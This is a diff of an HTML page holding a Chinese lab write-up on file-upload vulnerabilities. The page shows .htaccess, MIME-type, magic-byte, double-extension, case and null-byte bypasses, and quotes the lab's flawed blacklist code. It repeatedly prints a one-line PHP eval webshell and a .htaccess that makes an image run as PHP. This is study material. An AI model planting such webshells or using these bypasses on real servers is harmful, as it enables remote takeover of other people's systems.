@@ -288,15 +288,8 @@ if (!doNotTrack) {
  <!-- raw HTML omitted --></p>
 <p>上传成功，用蚁剑连接一下试试（这里可以在网页源码或者Burp的返回请求中看到图片的链接，如果临时文件存放的名字被改了就用得上） <!-- raw HTML omitted --></p>
 <p>用到的一句话木马 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><a class="link" href="https://www.edureka.co/community/66334/what-is-the-use-of-the-symbol-in-php"  target="_blank" rel="noopener"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><a class="link" href="https://www.edureka.co/community/66334/what-is-the-use-of-the-symbol-in-php"  target="_blank" rel="noopener"
     >PHP中@的作用</a>，本质上就是可以忽略所有的错误信息 <!-- raw HTML omitted --></p>
 <h4 id="解法二-禁用js">解法二：禁用JS</h4>
 <p>利用浏览器的选项或者插件禁用JS之后，客户端的过滤就失效了 <!-- raw HTML omitted --></p>
@@ -319,54 +312,18 @@ if (!doNotTrack) {
 <li>
 <p>.htaccess <!-- raw HTML omitted -->
 将 <code>trojan.jpg</code> 文件当作 <code>php</code> 来解析 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- .htaccess --&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- .htaccess --&gt;
 </span></span><span class="line"><span class="cl">&lt;FilesMatch &#34;trojan.jpg&#34;&gt;
 </span></span><span class="line"><span class="cl">Sethandler application/x-httpd-php
 </span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <p>以及含有一句话木马的 <code>trojan.jpg</code> <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>之后就可以用蚁剑测试连接成功（我这里发现测试连接性会报错，但是实际添加了连接是可以连接的） <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>之后就可以用蚁剑测试连接成功（我这里发现测试连接性会报错，但是实际添加了连接是可以连接的） <!-- raw HTML omitted --></p>
 <p>感觉其实要是像upload-files一样把源码贴出来就好了233 <!-- raw HTML omitted --></p>
 <p>最后我们来一起看一下php源码，主要是利用了黑名单过滤所有的webshell <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">            <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">            <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php7&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">);</span>
@@ -381,9 +338,7 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">            <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><dl>
+</span></span></code></pre></div><dl>
 <dt>basename()</dt>
 <dd>basename(string $path, string $suffix = &ldquo;&rdquo;): string <!-- raw HTML omitted -->
 path: 文件路径 <!-- raw HTML omitted -->
@@ -407,23 +362,7 @@ return: 根据flags决定, 多个内容的话就会返回数组（默认全部�
 <p>type/subtype <!-- raw HTML omitted --></p>
 <p>MIME类型对大小写不敏感，但是传统写法都是小写。 <!-- raw HTML omitted --></p>
 <p>然后查看源码 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/gif&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
@@ -435,9 +374,7 @@ return: 根据flags决定, 多个内容的话就会返回数组（默认全部�
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里检查的方式是检查 <code>$_FILES['file']['type']</code> 的值，这里我们来学习一下PHP的 <code>superglobals</code>: <code>$_FILES</code>,以及其相关的用法 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>这里检查的方式是检查 <code>$_FILES['file']['type']</code> 的值，这里我们来学习一下PHP的 <code>superglobals</code>: <code>$_FILES</code>,以及其相关的用法 <!-- raw HTML omitted --></p>
 <dl>
 <dt>$_FILES</dt>
 <dd>PHP官网：&ldquo;An associative array of items uploaded to the current script via the HTTP POST method.&rdquo; <!-- raw HTML omitted -->
@@ -474,23 +411,7 @@ $_FILES[&lsquo;userfile&rsquo;][&rsquo;name&rsquo;] = &ldquo;trojan.php&rdquo; <
 <h3 id="文件头绕过">文件头绕过</h3>
 <p>题目提示给的信息已经很多全面了，每一个文件的开头都存放了响应的格式指示，因此我们的目标就是修改这个文件头来实现绕过 <!-- raw HTML omitted --></p>
 <p>接着我们结合源码来看，后台首先还是检测了上题的 <code>MIME</code> 类型，需要修改一下，接着校验了三个图片格式的文件头是否存在于文件内 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/gif&#34;</span><span class="p">]))</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/gif&#34;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nv">$bin</span><span class="p">),</span> <span class="p">[</span><span class="s2">&#34;89504E47&#34;</span><span class="p">,</span> <span class="s2">&#34;FFD8FFE0&#34;</span><span class="p">,</span> <span class="s2">&#34;47494638&#34;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
@@ -502,9 +423,7 @@ $_FILES[&lsquo;userfile&rsquo;][&rsquo;name&rsquo;] = &ldquo;trojan.php&rdquo; <
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>那我们只需要用Burp截取请求之后，修改MIME类型以及加上文件头即可 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>那我们只需要用Burp截取请求之后，修改MIME类型以及加上文件头即可 <!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --> <!-- raw HTML omitted -->
 蚁剑连接成功 <!-- raw HTML omitted --></p>
 <p>JPEG (jpg)，文件头：FFD8FF， <code>ÿØÿ</code> <!-- raw HTML omitted -->
@@ -517,23 +436,7 @@ Adobe Acrobat (pdf)，文件头：255044462D312E, <code>%PDF-1.</code> <!-- raw 
 MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw HTML omitted --></p>
 <h3 id="有缺陷的代码1">有缺陷的代码1</h3>
 <p>根据题目提示结合源码，我们得知这里用了一个黑名单来过滤所有的webshell以及htaccess后缀的文件，猜测绕过可能发生在方法 <code>str_ireplace</code> 身上 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;ini&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -545,9 +448,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>根据以前绕过类似黑名单的经历，这里的 <code>str_ireplace</code> 简单的将所有的匹配替换为空，非常的危险，我们可以通过复写拼接的手段来进行绕过过滤 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>根据以前绕过类似黑名单的经历，这里的 <code>str_ireplace</code> 简单的将所有的匹配替换为空，非常的危险，我们可以通过复写拼接的手段来进行绕过过滤 <!-- raw HTML omitted --></p>
 <p>例如 <code>pphphp</code> 第一个碰到的php被替换之后，就可以形成一个完整的php后缀了 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-04-29_12-18-24_screenshot.png" width="400px"/>
 </figure>
@@ -555,23 +456,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 <p>蚁剑连接测试成功 <!-- raw HTML omitted --></p>
 <h3 id="有缺陷的代码2">有缺陷的代码2</h3>
 <p>因为提示与上一题基本类似，不过提到了手动改成了Windows的特性，因此我们直接一起来看一下源码吧 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">,</span> <span class="s2">&#34;ini&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -583,9 +468,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>发现这次的 <code>str_replace()</code> 方法替换的是空格，因此没办法用上一遍的套路 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>发现这次的 <code>str_replace()</code> 方法替换的是空格，因此没办法用上一遍的套路 <!-- raw HTML omitted --></p>
 <p>仔细一看，此replace非彼replace，这个 <code>str_replace</code> 是case sensitive而前一个的 <code>str_ireplace</code> 指的就是 case insensitive <!-- raw HTML omitted --></p>
 <p>那么我们用 <code>Php</code> 即可完成绕过 <!-- raw HTML omitted --></p>
 <p>但是就像提示所说的那样，这题实际用蚁剑是没有办法成功连接的，因为毕竟只是模拟windows环境，本质上还是linux，不存在这样的漏洞 <!-- raw HTML omitted --></p>
@@ -593,30 +476,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 <p>根据本题的提示，这是一个00漏洞，说其古老主要是因为只有在PHP版本小于5.3.4版本才有效，并且要求magic_quotes_gpc = Off的情况（我们在<a class="link" href="https://ginkgo.org.cn/posts/sqli_labs_study/#lesson-17"  target="_blank" rel="noopener"
     >sqli-labs的学习中</a>看到过这个） <!-- raw HTML omitted --></p>
 <p>结合源码来看，这里用了一个严格的白名单过滤，并且利用随机临时文件名，让我们无法使用 <code>htaccess</code> 来修改指定文件的配置 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$info</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
@@ -635,9 +495,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;文件类型不匹配&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>因此我们我们通过修改POST的文件路径在后面加上 <code>trojan.php%00</code>,然后将上传的文件改成gif格式，这样在上面进行后缀判断的时候，用的就是 <code>gif</code>,而进行存储的时候提取的后缀名就会因为 <code>%00</code> 的关系忽略最后的 <code>gif</code> 以及临时文件名的名字而只保存 <code>trojan.php</code>  <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>因此我们我们通过修改POST的文件路径在后面加上 <code>trojan.php%00</code>,然后将上传的文件改成gif格式，这样在上面进行后缀判断的时候，用的就是 <code>gif</code>,而进行存储的时候提取的后缀名就会因为 <code>%00</code> 的关系忽略最后的 <code>gif</code> 以及临时文件名的名字而只保存 <code>trojan.php</code>  <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-04-29_15-47-47_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
@@ -655,26 +513,7 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, <code>ÐÏ.à</code> <!-- raw
 <h3 id="黑名单缺陷">黑名单缺陷</h3>
 <p>看源码，观察到用了一个黑名单来过滤webshell，但是一看就比之前遇到过的黑名单短了很多，我们这里利用webshell会有很多的解析的变种来完成绕过 <!-- raw HTML omitted --></p>
 <p>将文件的后缀改为 <code>php4</code> 即可完成绕过 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
